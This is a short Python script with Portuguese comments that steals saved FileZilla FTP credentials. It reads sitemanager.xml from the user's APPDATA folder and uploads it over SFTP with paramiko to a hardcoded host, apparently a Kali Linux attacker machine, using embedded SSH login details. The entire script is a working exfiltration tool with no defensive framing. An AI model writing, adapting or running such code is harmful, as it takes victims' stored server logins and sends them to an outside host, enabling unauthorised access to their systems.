# Importando bibliotecas
import paramiko
import time
import os
import pathlib

# Exibe mensagem de conexao com o host
print('Tentando conexao com o host...')

host = '192.168.15.9'
user = 'kali'
passwd = 'kali'
path = '/home/kali/' # Trocar a pasta receptora aqui

# Arquivo de contas do Filezilla aqui #### NÃO MEXER
appdata = pathlib.Path(os.getenv('APPDATA'))
arquivo = appdata / 'FileZilla' / 'sitemanager.xml'
################

# Enviando arquivo de contas
#Criando um objeto SSHClient
try:
    # Conexão com o servidor
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(host, username=user, password=passwd)
    pass

except:
    print("Erro de conexão, o envio das contas não pode continuar.\nVerifique se o host está ativo ou o servidor ssh remoto está habilitado.")
    exit()

# Abrindo canal de comunicação
sftp = ssh.open_sftp()

print("Conexão estabelecida. Enviando arquivo...")
time.sleep(3)

# Enviando arquivo
try:
    sftp.put(arquivo, f'{path}/sitemanager.xml')

    # Fechando canal de comunicação
    sftp.close()

    print("Arquivo enviado com sucesso!")
    
except:
    print("Erro ao enviar o arquivo, verifique se o arquivo realmente existe no local ou se o Filezilla está instalado.")
